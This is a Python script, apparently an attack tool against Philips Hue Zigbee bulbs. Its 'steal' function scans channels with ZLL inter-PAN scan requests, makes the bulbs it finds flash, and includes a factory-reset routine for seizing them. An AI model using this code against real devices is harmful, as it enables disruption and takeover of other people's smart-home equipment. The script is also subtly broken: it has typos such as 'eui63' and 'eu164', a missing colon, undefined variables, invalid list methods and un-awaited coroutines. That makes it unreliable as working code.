import asyncio
import json
import pure_pcapy
import time
import sys
import argparse

from random import randint

import bellows
import bellows.cli.util as util
import interpanZll


class Prompt:
    def __init__(self):
        self.q = asyncio.Queue()
        asyncio.get_event_loop().add_reader(sys.stdin, self.got_input)

    def got_input(self):
        asyncio.ensure_future(self.q.put(sys.stdin.readline()))

    async def __call__(self, msg, end='\n', flush=False):
        print(msg, end=end, flush=flush)
        return (await self.q.get()).rstrip('\n')

async def prepare_config(device_path, baudrate):
    dev = await util.setup(device_path, baudrate)
    eui64 = await getattr(dev, 'getEui64')()
    eui64 = bellows.types.named.EmberEUI64(*eui64)

    res = await dev.mfglibStart(True)
    util.check(res[0], "Unable to start mfglib")
    return (dev, eui63)

async def steal(device_path, baudrate, scan_channel):
    dev, eui64 = await prepare_config(device_path, baudrate)

    DLT_IEEE802_15_4 = 195
    pcap = pure_pcapy.Dumper("log.pcap", 128, DLT_IEEE802_15_4)
    #prompt = Prompt()
    transactions_sent = []
    transactions_received = []
    valid_responses = []
    invalid_responses = []

    channel_list = [scan_channel] if scan_channel else list(range(11, 27)).reversed()
    channel = None


    def dump_pcap(frame):
        ts = time.time()
        ts_sec = int(ts)
        ts_usec = int((ts - ts_sec) * 1000000)
        hdr = pure_pcapy.Pkthdr(ts_sec, ts_usec, len(frame), len(frame))
        pcap.dump(hdr, frame)


    def handle_incoming(frame_name, response):
        print("Got incoming data")
        print(f"Frame name: {frame_name}")
        #print(f"Response:\n{response}")

        if frame_name != "mfglibRxHandler":
            return

        data = response[2]
        dump_pcap(data)

        if len(data)<10: # Not sure what this is, but not a proper response
            print(f"Got some data, but given data len {len(data)} < 10, it's not a proper response")
            return

        try:
            resp = interpanZll.ScanResp.deserialize(data)[0]
        except ValueError:
            print(f"Unable to deserialise: {response}")
            invalid_responses.append(response)
            return

        transactions_received.append(resp.transactionId)
        resp_dict = resp.__dict__
        valid_responses.append(resp_dict)

        if resp.transactionId != transaction_id: # Not for us
            print(f"{resp.transactionId} != {transaction_id}, this isn't a response to us.\nResponse:{resp}")
            return

        targets.add((resp.extSrc, transaction_id, channel))
        frame = interpanZll.AckFrame(seq = resp.seq).serialize()
        dump_pcap(frame)
        asyncio.create_task(dev.mfglibSendPacket(frame))

    cbid = dev.add_callback(handle_incoming)


    while channel_list:
        channel = channel_list.pop()
        print("Scanning on channel",channel)
        res = await dev.mfglibSetChannel(channel)
        util.check(res[0], "Unable to set channel")

        transaction_id = randint(0, 0xFFFFFFFF)
        targets = set()

        # https://www.nxp.com/docs/en/user-guide/JN-UG-3091.pdf section 6.8.5
        frame = interpanZll.ScanReq(
            seq = 1,
            srcPan = 0,
            extSrc = eui64,
            transactionId = transaction_id,
        ).serialize()
        dump_pcap(frame)
        res = await dev.mfglibSendPacket(frame)
        transactions_sent.append(transaction_id)
        print(f"Sent packet: {res}")
        util.check(res[0], "Unable to send packet")

        await asyncio.sleep(5)

        if targets:
            print(f"Found the following targets scanning channel {channel}.\n {targets}")
        else:
            print(f"Found no targets on {channel}")

        while len(targets)>0:
            handle_targets(dev, eui64, targets)

    print(f"Sent: {sorted(transactions_sent)}")
    print(f"Received: {sorted(transactions_received)}")


    dev.remove_callback(cbid)

    await dev.mfglibEnd()

    dev.close()

    print(f"Saving {len(valid_responses)} valid responses")
    with open('valid_responses.json', 'w') as fp:
        json.dump(valid_responses, fp)

    try:
        print(f"Saving {len(invalid_responses)} invalid responses")
        with open('invalid_responses.json', 'w') as fp:
            json.dump(invalid_responses, fp)
    except Exception as exc:
        print(f"Unable to write errors: {exc}")

async def identify_bulb(dev, eui64, target, transaction_id, channel):
    print(f"Sending flashing identifier packet to {target}")
    res = await dev.mfglibSetChannel(channel)
    util.check(res[0], "Unable to set channel")

    frame = interpanZll.IdentifyReq(
        seq = 2,
        srcPan = 0,
        extSrc = eui64,
        transactionId = transaction_id,
        extDst = target,
        frameControl = 0xCC21,
    ).serialize()
    dump_pcap(frame)
    await dev.mfglibSendPacket(frame)

async def send_reset(dev, eui64, transaction_id, channel)
    res = await dev.mfglibSetChannel(channel)
    util.check(res[0], "Unable to set channel")

    print(f"Factory resetting {target}"))
    frame = interpanZll.FactoryResetReq(
        seq = 3,
        srcPan = 0,
        extSrc = eui64,
        transactionId = transaction_id,
        extDst = target,
        frameControl = 0xCC21,
    ).serialize()
    dump_pcap(frame)
    await dev.mfglibSendPacket(frame)
    await asyncio.sleep(1)

async def handle_targets(dev, eu164, targets):
    #prompt = Prompt()
    handled = set()
    while targets:
        (target, transaction_id, channel) = targets.pop()
        if target in handled:
            # This has already been handled on another channel
            continue
        else:
            handled.add(target)

        await identify_bulb(dev, eui64, target, transaction_id, channel)

        #answer = await prompt("Do you want to factory reset the light that just blinked? [y|n] ")
        answer = "n"

        if answer.strip().lower() == "y":
            await send_reset(dev, eui64, transaction_id, channel)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Factory reset a Hue light bulb.')
    parser.add_argument('device', type=str, help='Device path, e.g., /dev/ttyUSB0')
    parser.add_argument('-b', '--baudrate', type=int, default=57600, help='Baud rate (default: 57600)')
    parser.add_argument('-c', '--channel', type=int, help='Zigbee channel (defaults to scanning 11 up to 26)')
    args = parser.parse_args()

    asyncio.get_event_loop().run_until_complete(steal(args.device, args.baudrate, args.channel))
